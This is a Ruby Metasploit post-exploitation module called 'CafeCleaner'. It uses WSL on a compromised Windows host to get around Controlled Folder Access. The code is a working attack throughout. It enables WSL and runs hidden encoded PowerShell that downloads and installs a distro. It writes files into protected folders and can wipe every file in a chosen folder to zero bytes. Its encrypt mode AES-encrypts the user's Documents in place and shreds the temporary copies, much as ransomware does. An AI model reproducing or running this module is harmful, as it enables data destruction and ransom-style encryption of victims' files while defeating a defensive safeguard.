require 'msf/core/post/file'
require 'msf/core'
require 'base64'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  WSL_DISTROS = {
    'wslubuntu1804' => 'https://aka.ms/wslubuntu1804',
    'wslubuntu2004' => 'https://aka.ms/wslubuntu2004',
    'wslubuntu2204' => 'https://aka.ms/wslubuntu2204',
    'wslubuntu2404' => 'https://aka.ms/wslubuntu2404',
    'wsldebian'     => 'https://aka.ms/wsl-debian-gnulinux',
    'wslkali'       => 'https://aka.ms/wsl-kali-linux-new',
    'wsloracle79'   => 'https://aka.ms/wsl-oraclelinux-7-9',
    'wsloracle87'   => 'https://aka.ms/wsl-oraclelinux-8-7',
    'wsloracle91'   => 'https://aka.ms/wsl-oraclelinux-9-1',
    'wslsuse156'    => 'https://aka.ms/wsl-opensuse-15-6',
    'wslslesp6'     => 'https://aka.ms/wsl-sles-15-sp6',
    'wslsusetw'     => 'https://aka.ms/wsl-opensuse-tumbleweed'
  }

  REG_KEYS = {
    'cfaPth'       => 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access',
    'proPth'       => '\\ProtectedFolders',
    'alwApp'       => '\\AllowedApplications',
    'wslInstalled' => 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss',
    'cfaKey'       => 'EnableControlledFolderAccess'
  }

  WSL_KEYS = {
    'path' => '/mnt/c',
    'encrypt' => 'openssl aes-256-cbc -pbkdf2 -e',
    'decrypt' => 'openssl aes-256-cbc -pbkdf2 -d'
  }

  def initialize(info = {})
    super(update_info(info,
      'Name'  => 'Windows CFA Bypass via WSL (CafeCleaner)',
      'Description' => %q{
        This module allows uploading files to a protected folder, check if Controlled Folder Access (CFA) is enabled,
        install WSL distros and encrypt/decrypt files using OpenSSL via WSL.
        It bypasses Windows Controlled Folder Access by leveraging NTFS-level permissions to perform file operations
        in protected folders, which are otherwise restricted by CFA.
      },
      'Author'  => 
        [
          'RGFulw' #Vuln & Module
        ],
      'License'         => MSF_LICENSE,
      'Version'         => '$Revision: 1.4 $',
      'References'  =>
        [
          ['URL', 'https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/controlled-folder-access'],
          ['URL', 'https://learn.microsoft.com/en-us/windows/wsl/install']
        ],
      'Notes' => {
        'Stability'     => ['CRASH_SAFE'],
        'Reliability'   => ['RELIABLE'],
        'SideEffects'   => ['IOC_IN_LOGS', 'IOC_IN_REGISTRY'],
        'Notes'         => ['This module requires administrative privileges to install WSL.']
      },
      'Platform'        => [ 'win' ],
      'Arch'            => [ARCH_ANY, ARCH_X86, ARCH_X64],
      'Targets'         =>
        [
          [ 'Windows', { 'Arch'     => ARCH_ANY } ],
          [ 'Windows x64', { 'Arch' => ARCH_X64 } ],
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ]
        ],
      'DefaultTarget'   => 1, # 64-bit
      'SessionTypes'    => [ 'meterpreter' ]
    ))

    register_options([
      OptString.new('FILENAME', [false, 'Local file to upload to the protected folder', '']),
      OptString.new('REMOTEDIR', [false, 'Remote protected folder path', '%USERPROFILE%/Documents'])
    ])

    register_advanced_options([
      OptBool.new('CHECK', [true, 'Check whether CFA is enabled', false]),
      OptString.new('WSLTYPE', [true, 'Specify WSL variant to install', 'wslubuntu2204']),
      OptString.new('KEY', [true, 'Encryption key for OpenSSL', 'YmFzZQo']),
      OptBool.new('ENCRYPT', [true, 'Whether to encrypt (true) or decrypt (false)', false])
    ])
  end

  def run
    return unless session.type == 'meterpreter'
    cfaCheck if datastore['CHECK']
    if datastore['ENCRYPT'] == true
      unless detect
        print_warning("WSL not detected, attempting installation...")
        install
      end
      encrypt
      return
    elsif datastore['ENCRYPT'] == false
      unless detect
        print_warning("WSL not detected, attempting installation...")
        install
      end
      decrypt
      return
    end

    if datastore['FILENAME'] && !datastore['FILENAME'].empty?
      upload
      return
    end

    if datastore['REMOTEDIR'] && !datastore['REMOTEDIR'].empty?
      overwrite
      return
    end
  end

  def upload
    local = datastore['FILENAME']
    return print_error("Local file not found: #{local}") unless ::File.exist?(local)
    filename = ::File.basename(local)
    temp = 'C:\\Windows\\Temp'
    tempPath = "#{temp}\\#{filename}"
    session.fs.file.upload(tempPath, local)
    remote = datastore['REMOTEDIR'].to_s.strip
    remote = '%USERPROFILE%\\Documents' if remote.empty?
    userprofile = session.sys.config.getenv('USERPROFILE') || ''
    expanded = remote.gsub('%USERPROFILE%', userprofile)
    dest = if expanded =~ /^([a-zA-Z]):\\(.*)$/i
      drive = Regexp.last_match(1).downcase
      rest = Regexp.last_match(2).gsub('\\', '/')
      "/mnt/#{drive}/#{rest}"
    else
      "#{WSL_KEYS['path']}/#{expanded.gsub(':', '').gsub('\\', '/')}"
    end

    target = "#{dest}/#{filename}"
    scriptPath = "#{WSL_KEYS['path']}/Windows/Temp/cafecleaner.sh"
    content = "#!/bin/bash\ncp \"#{WSL_KEYS['path']}/Windows/Temp/#{filename}\" \"#{target}\""
    cmd_exec("bash -c 'cat > #{scriptPath} << SCRIPTEOF\n#{content}\nSCRIPTEOF\n' && bash -c 'chmod +x #{scriptPath}' && bash '#{scriptPath}'")
    print_good("File moved via WSL from #{tempPath} to #{target}.")
    # cmd_exec("wsl bash -c 'rm -f \"#{scriptPath}\"'")
    cmd_exec("wsl bash -c 'rm -f \"#{WSL_KEYS['path']}/Windows/Temp/#{filename}\"'")
  end

  def detect
    enable
    base = REG_KEYS['wslInstalled']
    output = cmd_exec("reg query \"#{base}\"")
    unless output && output =~ /HKEY/
      print_warning("No WSL distros found under #{base}.")
      install
    end

    guids = output.scan(/HKEY[^\r\n]+/)
    found = false
    guids.each do |update_kbssubkey|
      distro_output = cmd_exec("reg query \"#{update_kbssubkey}\" /v DistributionName")
      if distro_output =~ /DistributionName\s+REG_SZ\s+(.+)/
        distro = Regexp.last_match(1).strip
        print_good(" - #{distro}")
        found = true
      end
    end

    print_warning("No named WSL distros found.") unless found
    return found
  end

  def install
    type = datastore['WSLTYPE'].to_s.downcase
    if type.empty?
      print_error("You must specify a WSLTYPE (e.g., wslubuntu2204, wslkali, etc).")
      return
    end
    url = WSL_DISTROS[type]
    unless url
      print_error("Unsupported WSLTYPE '#{type}'")
      return
    end
    file = "#{type}.appx"
    encoded = Rex::Text.encode_base64(%Q{
      Invoke-WebRequest -Uri '#{url}' -OutFile '#{file}';
      Add-AppxPackage '.\\#{file}'
    })
    session.sys.process.execute("powershell -encodedCommand #{encoded}", nil, {'Hidden' => true})
    print_status("WSL installation initiated for #{type}")
    return
  end

  def enable
    print_status("Checking if WSL is enabled...")
    output = cmd_exec("wsl --version 2>&1")
    if output =~ /version/i
      print_good("WSL is enabled.")
      return true
    else
      print_status("WSL not enabled. Enabling WSL...")
      cmd_exec("dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart")
      cmd_exec("wsl --set-default-version 1")
      return true
    end
  end

  def overwrite()
    remote = datastore['REMOTEDIR'].to_s.strip
    remote = '%USERPROFILE%\\Documents' if remote.empty?
    wslPath = get(remote)
    scriptPath = "#{WSL_KEYS['path']}/Windows/Temp/cafecleaner.sh"
    content = <<~BASH
      #!/bin/bash
      if [ ! -d "#{wslPath}" ]; then
        exit 2
      fi
      cd "#{wslPath}" || exit 3
      for f in *; do
        if [ -f "$f" ]; then
          truncate -s 0 "$f"
        fi
      done
    BASH

    write = <<~SH
      cat > #{scriptPath} <<'EOF'
      #{content}
      EOF
      chmod +x #{scriptPath}
    SH

    cmd_exec("bash -c \"#{write}\" 2>&1")
    cmd_exec("bash -lc \"#{scriptPath} 2>&1\"")
    print_good("Overwrite complete for #{remote} at #{wslPath}.")
    # cmd_exec("wsl bash -c 'rm -f \"#{scriptPath}\"'")
  end

  def encrypt
    wslOpenssl('encrypt')
  end

  def decrypt
    wslOpenssl('decrypt')
  end

  def wslOpenssl(mode)
    remote = datastore['REMOTEDIR'].to_s.strip
    remote = '%USERPROFILE%\\Documents' if remote.empty?
    wslPath = get(remote)
    key = datastore['KEY'] || ''
    tmpDir = "#{WSL_KEYS['path']}/Windows/Temp/"
    if mode == 'encrypt'
      action = <<~BASH
        outdir="#{tmpDir}"
        target="#{wslPath}"
        for file in *; do
          [ -f "$file" ] || continue
          #{WSL_KEYS['encrypt']} \
              -in "$file" \
              -out "$outdir/$file.enc" \
              -k '#{key}'
          for file in "$target"/*; do
              [ -f "$file" ] || continue
              cp -r "$outdir"/* "$target"/
              rm "$file"
          done
        done
        for file in "$outdir"/*; do
          [ -f "$file" ] || continue
          shred -u "$file"
        done
      BASH
    else
      action = <<~BASH
        cd "#{wslPath}" || exit 1
        shopt -s nullglob
        for f in *.enc; do
          if [ -f "$f" ]; then
            out_file="${f%.enc}"
            #{WSL_KEYS['decrypt']} -in "$f" -out "#{tmpDir}/$out_file" -k '#{key}' && rm -f "$f"
          fi
        done
        for dec in "#{tmpDir}"/*; do
          [ -f "$dec" ] || continue
          mv -f "$dec" "${dec##*/}"
        done
      BASH
    end

    scriptPath = "#{WSL_KEYS['path']}/Windows/Temp/cafecleaner.sh"
    content = <<~BASH
      #!/bin/bash
      #{action}
    BASH

    encoded = Rex::Text.encode_base64(content)
    cmd_exec("wsl bash -c \"echo #{encoded} | base64 -d > #{scriptPath}\"")
    cmd_exec("wsl bash -c \"chmod +x #{scriptPath} && #{scriptPath}\"")
    print_good("WSL OpenSSL #{mode} completed on #{wslPath} via #{tmpDir}.")
    # cmd_exec("wsl bash -c 'rm -f \"#{scriptPath}\"'")
  end

  def get(remote)
    expanded = expand(remote.to_s.strip)
    if expanded =~ %r{^([a-zA-Z]):\\(.*)}
      drive = Regexp.last_match(1).downcase
      rest = Regexp.last_match(2).gsub('\\', '/')
      "/mnt/#{drive}/#{rest}"
    elsif expanded.start_with?('/mnt/')
      expanded
    else
      cleaned = expanded.gsub(':', '').gsub('\\', '/').gsub(%r{//+}, '/')
      "#{WSL_KEYS['path']}/#{cleaned}"
    end
  end

  def expand(path)
    userprofile = session.sys.config.getenv('USERPROFILE') || ''
    fullPath = path.gsub('%USERPROFILE%', userprofile)
    fullPath = fullPath.force_encoding('UTF-8')
    fullPath.gsub(/[[:cntrl:]\u00AD]/, '')
  end

  def cfaCheck
    cfaPath = REG_KEYS['cfaPth']
    cfaKey = REG_KEYS['cfaKey']
    output = cmd_exec("reg query \"#{cfaPath}\" /v #{cfaKey}")
    if output =~ /#{cfaKey}\s+REG_DWORD\s+(0x[0-9a-fA-F]+)/
      value = Regexp.last_match(1)
      case value.downcase
      when '0x1'
        print_good("Controlled Folder Access is ENABLED.")
      when '0x0'
        print_warning("Controlled Folder Access is DISABLED.")
      end
    end

    keyPath = cfaPath + REG_KEYS['proPth']
    output = cmd_exec("reg query \"#{keyPath}\"")
    if output =~ /REG_SZ/
      print_status("Protected folders:")
      output.each_line do |line|
        print_good(" - #{line.strip}") if line =~ /REG_SZ/
      end
    else
      print_warning("No additional protected folders present.")
    end
    appPath = cfaPath + REG_KEYS['alwApp']
    appOut = cmd_exec("reg query \"#{appPath}\"")
    if appOut =~ /REG_SZ/
      print_status("Allowed applications:")
      appOut.each_line do |line|
        print_good(" - #{line.strip}") if line =~ /REG_SZ/
      end
    else
      print_warning("No allowed applications present.")
    end
  end

  def regValue(key, val)
    session.sys.registry.get_value(key, val)
  rescue
    nil
  end

  def regKeys(key)
    session.sys.registry.enum_keys(key)
  rescue
    []
  end
end
